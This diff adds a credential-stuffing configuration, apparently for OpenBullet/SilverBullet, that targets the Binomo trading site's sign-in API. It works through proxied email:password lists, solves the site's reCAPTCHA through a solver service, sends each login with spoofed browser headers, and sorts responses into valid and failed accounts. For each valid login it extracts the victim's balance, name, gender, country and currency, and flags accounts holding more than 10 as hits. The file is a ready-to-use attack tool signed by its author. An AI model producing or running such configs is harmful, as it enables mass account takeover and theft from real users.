@@ -1,0 +1,128 @@
+[SETTINGS]
+{
+  "Name": "BINOMO",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-29T20:02:51.3069724+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@uzzzul",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "USE SOLVER KEY",
+      "VariableName": "",
+      "Id": 731965605
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "BINOMO",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#CAP SOLVECAPTCHA ReCaptchaV2 "6LfhncAUAAAAANByGEJt7ICu_EpT5PoWqL4uuD6p" "https://binomo.com/auth" IsInvisible=TRUE 
+
+#LOGIN REQUEST POST "https://api.binomo.com/platform/v4/sign_in?locale=en" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"g-recaptcha-response\":\"<SOLUTION>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: no-cache, no-store, must-revalidate" 
+  HEADER "content-length: 1762" 
+  HEADER "content-type: application/json" 
+  HEADER "cookie: l=; ref.929a9991f7ee.group=4; __exponea_time2__=4.368582010269165; _gcl_au=1.1.47495093.1648571707; _ga=GA1.2.28687192.1648571708; _gid=GA1.2.1791534241.1648571708; _binomo_session=Y3RlNFg4cWhSK3ZISUQ3SlZWNHVibk9nT2tFejFrVmQwOUxuT3ZkZ2NabllOdFVXK1ByZlNNaEliRnR6Q0thNkJVWnovdFdqVDVPZGVNS3QzVDBaaHc9PS0tRHc0Q0RwdTc4UExPNlhYQ3hpTUJZZz09--62b8a43287bd8764b076cd9241f2d7e30296de10; __exponea_etc__=9f672348-f0fa-4033-87c5-253408470bfb; device_id=f81a6c05183a55509912f55f6f13af84; device_type=web; authtoken=" 
+  HEADER "device-id: f81a6c05183a55509912f55f6f13af84" 
+  HEADER "device-type: web" 
+  HEADER "origin: https://binomo.com" 
+  HEADER "referer: https://binomo.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Microsoft Edge\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55" 
+  HEADER "user-timezone: Asia/Beirut" 
+  HEADER "version: 7ebc3f5a" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true," 
+    KEY "authtoken" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false," 
+    KEY "You have entered an incorrect Username or Password." 
+    KEY "wrong_credentials" 
+
+#BALANCE PARSE "<SOURCE>" JSON "balance" CreateEmpty=FALSE -> CAP "BALANCE" 
+
+#F PARSE "<SOURCE>" JSON "first_name" -> VAR "F" 
+
+#L PARSE "<SOURCE>" JSON "lirst_name" -> VAR "L" 
+
+#NAME FUNCTION Constant "<F> <L>" -> CAP "NAME" 
+
+#GENDER PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "GENDER" 
+
+#COUNTRY PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "COUNTY" 
+
+#CURRENCY PARSE "<SOURCE>" JSON "currency" CreateEmpty=FALSE -> CAP "CURRENCY" 
+
+#FREE KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<BALANCE>" GreaterThan "10" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<BALANCE>" Contains "0" 
+
+#AUTHOR FUNCTION Constant "@uzzzul" -> CAP "CONFIGBY" 
+
